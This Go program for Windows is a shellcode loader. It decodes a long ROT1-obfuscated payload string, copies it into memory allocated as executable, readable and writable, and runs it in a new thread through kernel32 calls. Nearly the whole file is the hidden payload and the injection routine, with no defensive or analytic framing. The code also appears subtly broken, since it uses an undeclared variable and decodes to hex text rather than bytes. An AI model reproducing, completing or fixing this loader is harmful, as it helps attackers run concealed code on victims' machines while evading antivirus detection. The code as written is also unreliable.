package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func rot1Decrypt(input string) []byte {
	// Reverse ROT1 transformation for all ASCII characters
	decrypted := make([]byte, len(input))
	for i, r := range input {
		decrypted[i] = byte((r - 1 + 128) % 128) // Decrypt each character
	}
	return decrypted
}

func main() {
// ROT1 encoded shellcode
	rot1Sc := "1y11-!1y11-!1y11-!1y59-!1y9:-!1y55-!1y35-!1y49-!1y59-!1y9c-!1y16-!1y47-!1y53-!1y1f-!1y11-!1y59-!1y9e-!1y2e-!1yfg-!1y1:-!1y14-!1y11-!1yc:-!1y4b-!1y11-!1y11-!1y11-!1y59-!1y9:-!1ydg-!1yf9-!1y23-!1y8g-!1ygf-!1ygg-!1y59-!1y9c-!1y16-!1y2c-!1y53-!1y1f-!1y11-!1y59-!1y9c-!1y65-!1y35-!1y49-!1y59-!1y9c-!1y:b-!1y49-!1y12-!1y11-!1y11-!1y59-!1y9c-!1y9b-!1y51-!1y12-!1y11-!1y11-!1y59-!1y9c-!1ycb-!1y59-!1y12-!1y11-!1y11-!1yf9-!1yfd-!1y8f-!1ygf-!1ygg-!1y59-!1y9e-!1y2e-!1yge-!1yf1-!1y15-!1y11-!1y59-!1yg8-!1yec-!1y77-!1y:1-!1y59-!1y96-!1yec-!1y85-!1y65-!1y59-!1y9c-!1y16-!1yf5-!1y52-!1y1f-!1y11-!1y59-!1y9e-!1y2e-!1yf6-!1yf1-!1y15-!1y11-!1yc:-!1y12-!1y11-!1y11-!1y11-!1y59-!1y9:-!1ydg-!1y1g-!1y2g-!1y55-!1y11-!1y11-!1yf9-!1ycc-!1y8f-!1ygf-!1ygg-!1y42-!1yd1-!1y42-!1yd:-!1y59-!1y9e-!1y2e-!1y6d-!1y1c-!1y14-!1y11-!1y59-!1y9:-!1ydg-!1y59-!1y9:-!1yd7-!1y42-!1yd1-!1yc:-!1y4e-!1y11-!1y11-!1y11-!1y1g-!1y2g-!1y11-!1yf9-!1y6c-!1yge-!1yg:-!1ygg-!1yf9-!1yc7-!1y:9-!1yg6-!1ygg-!1y59-!1y9:-!1yd4-!1y59-!1y9e-!1y16-!1ybd-!1yc2-!1y11-!1y11-!1yf9-!1yf8-!1y63-!1yg9-!1ygg-!1yf9-!1y13-!1yff-!1ygb-!1ygg-!1y77-!1y:1-!1yf9-!1ygc-!1yfe-!1ygb-!1ygg-!1yc9-!1y4:-!1y11-!1y11-!1y11-!1y59-!1y9e-!1y1e-!1yde-!1y19-!1y14-!1y11-!1yfc-!1yc7-!1y59-!1y9:-!1y55-!1y35-!1y19-!1yf9-!1y34-!1y5d-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1yf:-!1ye:-!1ygf-!1ygg-!1ygg-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y71-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y29-!1y59-!1y9c-!1y59-!1y19-!1y59-!1y4:-!1y5c-!1y19-!1y86-!1y57-!1y59-!1y9:-!1y55-!1y35-!1y39-!1y59-!1y9:-!1y6d-!1y35-!1y41-!1y59-!1y9c-!1y21-!1y59-!1y9c-!1y44-!1y59-!1y9:-!1ye1-!1y59-!1y9:-!1yg4-!1yf9-!1y3e-!1y27-!1yg6-!1ygg-!1y95-!1yd1-!1y85-!1y38-!1y59-!1y9c-!1y65-!1y35-!1y39-!1y59-!1y9c-!1y53-!1y21-!1y59-!1y9c-!1y85-!1y35-!1y41-!1y59-!1y4:-!1y57-!1y21-!1y85-!1y15-!1y42-!1yd1-!1yfc-!1y22-!1y59-!1y9c-!1y6b-!1y29-!1y59-!1y9c-!1y5f-!1y29-!1yf9-!1y55-!1y43-!1yg6-!1ygg-!1yfc-!1y13-!1y42-!1yd1-!1y59-!1y94-!1yd5-!1y29-!1y6e-!1yd4-!1y59-!1y9:-!1y55-!1y35-!1y19-!1y59-!1y9:-!1y6d-!1y35-!1y21-!1yf9-!1y9c-!1y5c-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1y59-!1y9c-!1y6d-!1y35-!1y21-!1y:1-!1yf:-!1y8c-!1ygg-!1ygg-!1ygg-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y71-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y29-!1y59-!1y9c-!1y59-!1y19-!1y59-!1y4:-!1y5c-!1y19-!1y86-!1y57-!1y59-!1y9:-!1y55-!1y35-!1y39-!1y59-!1y9:-!1y6d-!1y35-!1y41-!1y59-!1y9c-!1y21-!1y59-!1y9c-!1y44-!1y59-!1y9:-!1ye1-!1y59-!1y9:-!1yg4-!1yf9-!1y9e-!1y26-!1yg6-!1ygg-!1y95-!1yd1-!1y85-!1y38-!1y59-!1y9c-!1y65-!1y35-!1y39-!1y59-!1y9c-!1y53-!1y21-!1y59-!1y9c-!1y85-!1y35-!1y41-!1y59-!1y4:-!1y57-!1y21-!1y85-!1y15-!1y42-!1yd1-!1yfc-!1y22-!1y59-!1y9c-!1y6b-!1y29-!1y59-!1y9c-!1y5f-!1y29-!1yf9-!1yb5-!1y42-!1yg6-!1ygg-!1yfc-!1y13-!1y42-!1yd1-!1y59-!1y94-!1yd5-!1y29-!1y6e-!1yd4-!1y59-!1y9:-!1y55-!1y35-!1y19-!1y59-!1y9:-!1y6d-!1y35-!1y21-!1yf9-!1yfc-!1y5b-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1y59-!1y9c-!1y6d-!1y35-!1y21-!1y:1-!1yf:-!1y8c-!1ygg-!1ygg-!1ygg-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y75-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y59-!1y5e-!1y9c-!1y77-!1y31-!1y5e-!1y96-!1yf5-!1y86-!1y75-!1y59-!1y96-!1yd1-!1y85-!1y59-!1y59-!1y9c-!1y59-!1y19-!1y59-!1y9:-!1y5d-!1y35-!1y49-!1y59-!1y9c-!1y21-!1y59-!1y9:-!1y65-!1y35-!1y51-!1y59-!1y9c-!1y69-!1y21-!1y59-!1y9c-!1y6c-!1y29-!1y59-!1y9c-!1y51-!1y29-!1ygg-!1ye4-!1y59-!1y9c-!1y5d-!1y35-!1y49-!1y59-!1y9e-!1y4e-!1y5d-!1y76-!1y13-!1y11-!1ycf-!1y13-!1y11-!1y11-!1y11-!1y5:-!1y9:-!1yd1-!1y5:-!1y9:-!1ye:-!1y42-!1yd1-!1y59-!1y9c-!1y6d-!1y35-!1y51-!1yf9-!1y13-!1ygd-!1yg:-!1ygg-!1y59-!1y94-!1yd5-!1y59-!1y6e-!1yd4-!1yf9-!1y:8-!1y8e-!1yg6-!1ygg-!1y:1-!1y59-!1y9:-!1y55-!1y35-!1y19-!1yf9-!1y5d-!1y5b-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1yfc-!1y96-!1y5d-!1y9e-!1y7d-!1y35-!1y69-!1y5e-!1y4:-!1y3d-!1y35-!1y86-!1y:2-!1y5:-!1y9:-!1y35-!1y35-!1yfc-!1y9c-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y66-!1y59-!1y9:-!1yf6-!1y5e-!1y9c-!1y77-!1y31-!1y5e-!1y96-!1yf5-!1y86-!1y2:-!1y59-!1y96-!1yd1-!1y85-!1y1b-!1y59-!1y9c-!1y69-!1y29-!1y59-!1y9c-!1y51-!1y21-!1y6e-!1yd4-!1y1g-!1y2g-!1y51-!1y11-!1yf9-!1y4c-!1y8e-!1yg6-!1ygg-!1y:1-!1y5d-!1y9e-!1y7d-!1y35-!1y21-!1y5e-!1y4:-!1y3d-!1y35-!1y86-!1yed-!1y5:-!1y9:-!1y35-!1y35-!1yfc-!1ye7-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y37-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y19-!1y5e-!1y9c-!1y77-!1y31-!1y5e-!1y96-!1yf5-!1y86-!1y55-!1y59-!1y9:-!1y55-!1y35-!1y29-!1y59-!1y9:-!1y6d-!1y35-!1y31-!1yf9-!1y4b-!1y7:-!1ygf-!1ygg-!1y59-!1y94-!1yd5-!1y19-!1y6e-!1yd4-!1y59-!1y9:-!1y55-!1y35-!1y19-!1y59-!1y9:-!1y6d-!1y35-!1y21-!1y59-!1y9:-!1y5d-!1y35-!1y29-!1y59-!1y9:-!1y8d-!1y35-!1y31-!1yf9-!1y:c-!1y5:-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1y59-!1y9c-!1y6d-!1y35-!1y21-!1y59-!1y9c-!1y5d-!1y35-!1y29-!1y59-!1y9c-!1y8d-!1y35-!1y31-!1yfc-!1yb6-!1y5d-!1y9e-!1y7d-!1y35-!1y29-!1y5e-!1y4:-!1y3d-!1y35-!1y86-!1yc2-!1y5:-!1y9:-!1y35-!1y35-!1yfc-!1ybc-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y2g-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y19-!1y5e-!1y9c-!1y77-!1y31-!1y5e-!1y96-!1yf5-!1y86-!1y2g-!1y59-!1y9c-!1y11-!1yf9-!1yd2-!1y79-!1ygf-!1ygg-!1y59-!1y94-!1yd5-!1y19-!1y6e-!1yd4-!1y59-!1y9:-!1y55-!1y35-!1y19-!1yf9-!1y42-!1y5:-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1yfc-!1ydb-!1y5d-!1y9e-!1y7d-!1y35-!1y29-!1y1g-!1y2g-!1y55-!1y11-!1y11-!1y5e-!1y4:-!1y3d-!1y35-!1y86-!1ye2-!1y5:-!1y9:-!1y35-!1y35-!1yfc-!1ydc-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y63-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y29-!1y59-!1y9c-!1y21-!1y59-!1y4:-!1y24-!1y86-!1y49-!1y59-!1y9:-!1y55-!1y35-!1y39-!1y59-!1y9:-!1y6d-!1y35-!1y41-!1y59-!1y9c-!1y81-!1y19-!1y59-!1y9c-!1y5c-!1y19-!1y59-!1y9:-!1ye1-!1y59-!1y9:-!1yg4-!1yf9-!1y7e-!1y3g-!1yg6-!1ygg-!1y95-!1yd1-!1y85-!1y28-!1y59-!1y9c-!1y5d-!1y35-!1y39-!1y59-!1y9c-!1y5:-!1y21-!1y59-!1y9c-!1y65-!1y35-!1y41-!1y59-!1y4:-!1y5b-!1y21-!1y1g-!1y:5-!1yd2-!1yfc-!1y13-!1y42-!1yd:-!1y9:-!1yd9-!1y59-!1y94-!1yd5-!1y29-!1y6e-!1yd4-!1y59-!1y9:-!1y55-!1y35-!1y19-!1y59-!1y9:-!1y6d-!1y35-!1y21-!1yf9-!1y::-!1y59-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1y59-!1y9c-!1y6d-!1y35-!1y21-!1yfc-!1y9e-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y87-!1y52-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y29-!1y59-!1y9c-!1y21-!1y59-!1y4:-!1y24-!1y86-!1y3:-!1y59-!1y9c-!1y61-!1y19-!1y77-!1y1g-!1y2g-!1y55-!1y11-!1y11-!1y59-!1y4:-!1y64-!1y19-!1y85-!1y15-!1y42-!1yd1-!1yfc-!1y28-!1y59-!1y9c-!1y81-!1y21-!1y59-!1y9c-!1y5c-!1y21-!1y59-!1y9:-!1ye1-!1y59-!1y9:-!1yg4-!1yf9-!1yf4-!1y3f-!1yg6-!1ygg-!1yfc-!1y13-!1y42-!1yd1-!1y59-!1y94-!1yd5-!1y29-!1y6e-!1yd4-!1y59-!1y9:-!1y55-!1y35-!1y19-!1y59-!1y9:-!1y6d-!1y35-!1y21-!1yf9-!1y3b-!1y59-!1ygc-!1ygg-!1y59-!1y9c-!1y55-!1y35-!1y19-!1y59-!1y9c-!1y6d-!1y35-!1y21-!1yfc-!1y:f-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1ydd-!1y5:-!1y4c-!1y77-!1y21-!1y1g-!1y97-!1yg6-!1y11-!1y11-!1y11-!1y66-!1y59-!1y9:-!1yf6-!1y59-!1y94-!1yfd-!1y81-!1y59-!1y9e-!1y16-!1y2e-!1y82-!1y13-!1y11-!1ycc-!1y1c-!1y11-!1y11-!1y11-!1y42-!1yd:-!1y42-!1ygg-!1y59-!1y9:-!1ygf-!1yf9-!1y27-!1yc7-!1ygg-!1ygg-!1y59-!1y9:-!1y55-!1y35-!1y39-!1yf9-!1ybd-!1yd:-!1ygg-!1ygg-!1y59-!1y96-!1yd1-!1y85-!1y6b-!1y55-!1y1g-!1y22-!1y8d-!1y35-!1y61-!1y55-!1y1g-!1y22-!1y8d-!1y35-!1y71-!1y59-!1y9e-!1y26-!1y25-!1ybe-!1y11-!1y11-!1y59-!1y9:-!1y65-!1y35-!1y61-!1y59-!1y9e-!1y26-!1y31-!1yfc-!1y15-!1y11-!1y59-!1y9:-!1y65-!1y35-!1y69-!1y85-!1y15-!1y59-!1y9c-!1y51-!1y19-!1y59-!1y9:-!1y55-!1y35-!1y71-!1y59-!1y9:-!1y6d-!1y35-!1y79-!1y59-!1y9c-!1y2e-!1ye5-!1y4d-!1y1f-!1y11-!1y59-!1y9e-!1y16-!1yge-!1yg1-!1y15-!1y11-!1y59-!1y9e-!1y5d-!1y35-!1y61-!1ycg-!1y13-!1y11-!1y11-!1y11-!1y59-!1y9:-!1ygf-!1yf9-!1y64-!1ye7-!1ygf-!1ygg-!1y59-!1y94-!1yd5-!1y81-!1y6e-!1yd4-!1y59-!1y9c-!1y55-!1y35-!1y39-!1yf9-!1yf4-!1yed-!1ygg-!1ygg-!1y1g-!1y2g-!1y11-!1y59-!1y96-!1yd1-!1y85-!1y65-!1y55-!1y1g-!1y22-!1y8d-!1y35-!1y41-!1y55-!1y1g-!1y22-!1y8d-!1y35-!1y51-!1y59-!1y9e-!1y26-!1yb9-!1ybd-!1y11-!1y11-!1y59-!1y9:-!1y65-!1y35-!1y41-!1y59-!1y9e-!1y26-!1yd5-!1yfb-!1y15-!1y11-!1y59-!1y9:-!1y65-!1y35-!1y49-!1y85-!1y15-!1y59-!1y9c-!1y51-!1y19-!1y59-!1y9:-!1y55-!1y35-!1y51-!1y59-!1y9:-!1y6d-!1y35-!1y59-!1y59-!1y9c-!1y2e-!1y79-!1y4d-!1y1f-!1y11-!1y59-!1y9e-!1y16-!1y:2-!1yg1-!1y15-!1y11-!1y59-!1y9e-!1y5d-!1y35-!1y41-!1ycg-!1y13-!1y11-!1y11-!1y11-!1y59-!1y9:-!1ygf-!1yf9-!1yf8-!1ye6-!1ygf-!1ygg-!1y59-!1y94-!1yd5-!1y81-!1y6e-!1yd4-!1y:1-!1yf9-!1ygc-!1y57-!1ygc-!1ygg-!1yf:-!1yg7-!1ygf-!1ygg-!1ygg-!1ydd-!"
	shellcode = rot1Decrypt(rot1Sc)

	// Windows API functions
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	// Allocate memory (using VirtualAlloc) - executable, writable, and readable memory
	addr, _, err := virtualAlloc.Call(
		0, 
		uintptr(len(shellcode)), 
		windows.MEM_COMMIT|windows.MEM_RESERVE, 
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}
	fmt.Printf("Memory allocated at: %v\n", addr)

	// Copy the shellcode into the allocated memory
	_, _, err = rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != syscall.Errno(0) {
		fmt.Printf("RtlMoveMemory failed: %v\n", err)
		return
	}

	// Create a new thread to execute the shellcode
	threadHandle, _, err := createThread.Call(
		0, 0, addr, 0, 0, 0, 
	)
	if threadHandle == 0 {
		fmt.Printf("CreateThread failed: %v\n", err)
		return
	}
	fmt.Printf("Shellcode thread created successfully with handle: %v\n", threadHandle)

	// Wait for the shellcode thread to finish
	ret, _, err := waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
	if ret == 0xFFFFFFFF {
		fmt.Printf("WaitForSingleObject failed: %v\n", err)
		return
	}

	fmt.Println("Shellcode executed and thread completed successfully.")
}

